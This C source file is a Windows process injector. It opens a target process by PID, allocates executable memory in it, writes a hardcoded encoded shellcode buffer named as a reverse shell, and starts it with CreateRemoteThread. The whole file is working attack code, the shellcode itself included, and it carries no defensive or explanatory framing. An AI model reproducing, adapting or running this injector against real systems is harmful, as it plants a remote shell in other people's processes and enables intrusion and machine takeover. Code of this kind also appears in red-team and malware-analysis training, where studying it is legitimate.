#include <windows.h>
#include <stdio.h>
#include "../utils/utility.h"


int main(int argc, char const *argv[])
{
    char msg[MAX_STRING];
    DWORD pid;
    HANDLE hProcess, hThread = NULL;
    unsigned char revShell[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xe2\x78\xd1\xe7\x2e\xdc\x93\xc3\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1e\x30\x52"
"\x03\xde\x34\x53\xc3\xe2\x78\x90\xb6\x6f\x8c\xc1\x92\xb4"
"\x30\xe0\x35\x4b\x94\x18\x91\x82\x30\x5a\xb5\x36\x94\x18"
"\x91\xc2\x30\x5a\x95\x7e\x94\x9c\x74\xa8\x32\x9c\xd6\xe7"
"\x94\xa2\x03\x4e\x44\xb0\x9b\x2c\xf0\xb3\x82\x23\xb1\xdc"
"\xa6\x2f\x1d\x71\x2e\xb0\x39\x80\xaf\xa5\x8e\xb3\x48\xa0"
"\x44\x99\xe6\xfe\x57\x13\x4b\xe2\x78\xd1\xaf\xab\x1c\xe7"
"\xa4\xaa\x79\x01\xb7\xa5\x94\x8b\x87\x69\x38\xf1\xae\x2f"
"\x0c\x70\x95\xaa\x87\x18\xa6\xa5\xe8\x1b\x8b\xe3\xae\x9c"
"\xd6\xe7\x94\xa2\x03\x4e\x39\x10\x2e\x23\x9d\x92\x02\xda"
"\x98\xa4\x16\x62\xdf\xdf\xe7\xea\x3d\xe8\x36\x5b\x04\xcb"
"\x87\x69\x38\xf5\xae\x2f\x0c\xf5\x82\x69\x74\x99\xa3\xa5"
"\x9c\x8f\x8a\xe3\xa8\x90\x6c\x2a\x54\xdb\xc2\x32\x39\x89"
"\xa6\x76\x82\xca\x99\xa3\x20\x90\xbe\x6f\x86\xdb\x40\x0e"
"\x58\x90\xb5\xd1\x3c\xcb\x82\xbb\x22\x99\x6c\x3c\x35\xc4"
"\x3c\x1d\x87\x8c\xae\x90\xab\xe0\xf1\xbd\x4b\xe3\xe7\x2e"
"\x9d\xc5\x8a\x6b\x9e\x99\x66\xc2\x7c\x92\xc3\xe2\x31\x58"
"\x02\x67\x60\x91\xc3\xf3\x24\x11\x4f\x16\xb0\xd2\x97\xab"
"\xf1\x35\xab\xa7\x2d\xd2\x79\xae\x0f\xf7\xe0\xd1\x09\xdf"
"\x4a\x08\x10\xd0\xe6\x2e\xdc\xca\x82\x58\x51\x51\x8c\x2e"
"\x23\x46\x93\xb2\x35\xe0\x2e\x63\xed\x53\x8b\x1d\xb8\x99"
"\x6e\xec\x94\x6c\x03\xaa\xf1\x10\xa6\x94\x36\x9c\x1c\x02"
"\x87\x04\xaf\xa7\x1b\xf9\xd3\xa3\x20\x9d\x6e\xcc\x94\x1a"
"\x3a\xa3\xc2\x48\x42\x5a\xbd\x6c\x16\xaa\xf9\x15\xa7\x2c"
"\xdc\x93\x8a\x5a\x1b\xbc\x83\x2e\xdc\x93\xc3\xe2\x39\x81"
"\xa6\x7e\x94\x1a\x21\xb5\x2f\x86\xaa\x1f\x1c\xf9\xce\xbb"
"\x39\x81\x05\xd2\xba\x54\x87\xc6\x2c\xd0\xe6\x66\x51\xd7"
"\xe7\xfa\xbe\xd1\x8f\x66\x55\x75\x95\xb2\x39\x81\xa6\x7e"
"\x9d\xc3\x8a\x1d\xb8\x90\xb7\x67\x23\x5b\x8e\x6b\xb9\x9d"
"\x6e\xef\x9d\x29\xba\x2e\x47\x57\x18\xfb\x94\xa2\x11\xaa"
"\x87\x1b\x6c\x20\x9d\x29\xcb\x65\x65\xb1\x18\xfb\x67\x73"
"\xde\xc8\x72\x90\x5d\x88\x49\x2e\x5e\x1d\xad\x99\x64\xea"
"\xf4\xaf\xc5\x9e\x72\x51\x1c\xce\xa9\x96\x78\xa5\x6b\xa3"
"\x88\x44\xdc\xca\x82\x6b\xa2\x2e\x32\x2e\xdc\x93\xc3";

    size_t revShellSize = sizeof(revShell);

    if (argc < 2){
        MESSAGE(INFO, "Usage %s <pid>\n", argv[0]);
        return EXIT_SUCCESS;
    }

    pid = atoi(argv[1]);
    //info((char*)"Enter the PID: ");
    //scanf("%ld", &pid);
    MESSAGE(INFO, "Trying to open process with (%ld)\n", pid);

    // HANDLE OpenProcess(
    //   [in] DWORD dwDesiredAccess,
    //   [in] BOOL  bInheritHandle,
    //   [in] DWORD dwProcessId
    // );
    // Open handle to the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess == NULL){
        MESSAGE(FAIL, "Impossible to get handle of the process(0x%p): Error %ld\n", hProcess, GetLastError());
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Handle got for process(0x%p)\n", hProcess);

    // LPVOID VirtualAllocEx(
    //   [in]           HANDLE hProcess,
    //   [in, optional] LPVOID lpAddress,
    //   [in]           SIZE_T dwSize,
    //   [in]           DWORD  flAllocationType,
    //   [in]           DWORD  flProtect
    // );
    // Allocate bytes to process memory
    LPVOID baseAddr = VirtualAllocEx(hProcess, NULL, revShellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in process(0x%p): Error %ld\n", revShellSize, hProcess, GetLastError());
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in process(0x%p)\n", revShellSize, hProcess);

    // BOOL WriteProcessMemory(
    //   [in]  HANDLE  hProcess,
    //   [in]  LPVOID  lpBaseAddress,
    //   [in]  LPCVOID lpBuffer,
    //   [in]  SIZE_T  nSize,
    //   [out] SIZE_T  *lpNumberOfBytesWritten
    // );
    // Write bytes(shellcode) to process allocated memory
    if (WriteProcessMemory(hProcess, baseAddr, (LPCVOID)revShell, revShellSize, NULL) == 0){
        MESSAGE(FAIL, "Impossible to write shellcode to process(0x%p): Error %ld\n", hProcess, GetLastError());
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of process(0x%p)\n", revShellSize, hProcess);

    // HANDLE CreateRemoteThread(
    //   [in]  HANDLE                 hProcess,
    //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    //   [in]  SIZE_T                 dwStackSize,
    //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,
    //   [in]  LPVOID                 lpParameter,
    //   [in]  DWORD                  dwCreationFlags,
    //   [out] LPDWORD                lpThreadId
    // );
    // Create thread to run the shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);
    if ( hThread == NULL){
        MESSAGE(FAIL, "Impossible to create thread in process(0x%p): Error %ld\n", hProcess, GetLastError());
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Successfully create thread(0x%p) to run the shellcode in process(0x%p)\n", hThread, hProcess);

    MESSAGE(OKAY, "Waiting for thread to finish executing...\n");
    WaitForSingleObject(hThread, INFINITE);
    
    MESSAGE(OKAY,"Thread finished executing, cleaning up\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}
